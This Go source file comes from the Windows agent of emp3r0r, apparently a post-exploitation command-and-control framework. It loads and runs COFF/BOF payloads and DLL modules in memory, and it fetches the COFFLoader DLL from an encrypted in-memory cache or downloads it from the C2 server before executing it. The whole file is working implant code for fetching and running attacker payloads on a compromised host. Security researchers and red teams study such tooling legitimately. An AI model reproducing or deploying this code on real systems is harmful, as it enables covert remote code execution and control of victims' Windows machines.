//go:build windows

package modules

import (
	"fmt"
	"runtime"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/coffloader"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// runCOFFModule executes a COFF/BOF payload on Windows via the in-memory
// COFFLoader DLL. The DLL is fetched from memfs (or C2), loaded, called once,
// and unloaded by coffloader.RunWindowsCOFFViaDLL.
func runCOFFModule(payload []byte, invocation def.ResolvedInvocation, token uintptr) (out string, err error) {
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("runCOFFModule panic: %v", r)
			out = ""
		}
	}()

	if invocation.Coff == nil {
		return "", fmt.Errorf("missing COFF invocation data")
	}

	entry := invocation.Coff.Export
	dllData, err := fetchDependencyDLL("coffloader")
	if err != nil {
		return "", fmt.Errorf("loading coffloader dependency: %w", err)
	}

	logging.Debugf("runCOFFModule: executing %s via in-memory COFFLoader DLL", entry)
	return coffloader.RunWindowsCOFFViaDLL(dllData, payload, entry, coffArgsFromInvocation(invocation), token)
}

// runDLLModule runs an in-memory DLL module (agent_config.type == "dll").
// dllData is the decompressed DLL image; the BOF payload is read from the
// agent-local/memfs path in invocation.DllFileValue. The DLL is loaded,
// used once, and unloaded by coffloader.RunWindowsCOFFViaDLL.
func runDLLModule(dllData []byte, invocation def.ResolvedInvocation, token uintptr) (out string, err error) {
	if invocation.DllFileValue == "" {
		return "", fmt.Errorf("DLL module is missing its BOF file parameter")
	}

	bofData, err := util.ReadFileAgent(invocation.DllFileValue)
	if err != nil {
		return "", fmt.Errorf("reading BOF file %s: %w", invocation.DllFileValue, err)
	}

	entry := invocation.DllEntry
	if entry == "" {
		entry = "go"
	}

	return coffloader.RunWindowsCOFFViaDLL(dllData, bofData, entry, coffArgsFromInvocation(invocation), token)
}

// fetchDependencyDLL returns the raw DLL bytes for a named DLL module
// dependency (e.g. "coffloader"). It checks the encrypted memfs cache first
// and falls back to downloading the C2-hosted <name>.<arch>.gz module payload.
//
// Module names are canonicalized to lowercase so a dependency spelled
// "COFFLoader" still resolves to the C2-hosted "coffloader.<arch>.gz".
func fetchDependencyDLL(name string) ([]byte, error) {
	name = strings.ToLower(name)
	rawKey := "mem:///" + name + ".dll"
	if cached, err := util.ReadFileAgent(rawKey); err == nil && len(cached) > 0 {
		logging.Debugf("fetchDependencyDLL: hit memfs cache %s", rawKey)
		return cached, nil
	}

	hostedName := fmt.Sprintf("%s.%s.gz", name, runtime.GOARCH)
	compressed, err := fetchFile(common.RuntimeConfig, "", hostedName, "", "")
	if err != nil {
		return nil, fmt.Errorf("fetching %s: %w", hostedName, err)
	}
	data, err := util.Decompress(compressed)
	if err != nil {
		return nil, fmt.Errorf("decompressing %s: %w", hostedName, err)
	}
	if err := util.WriteFileAgent(rawKey, data, 0o600); err != nil {
		logging.Debugf("fetchDependencyDLL: caching %s failed: %v", rawKey, err)
	}
	return data, nil
}

// coffArgsFromInvocation converts resolved COFF args into the coffloader
// representation used by the DLL loader.
func coffArgsFromInvocation(invocation def.ResolvedInvocation) []coffloader.CoffArg {
	if invocation.Coff == nil {
		return nil
	}
	args := make([]coffloader.CoffArg, 0, len(invocation.Coff.Args))
	for _, a := range invocation.Coff.Args {
		args = append(args, coffloader.CoffArg{WireType: a.WireType, Value: a.Value})
	}
	return args
}
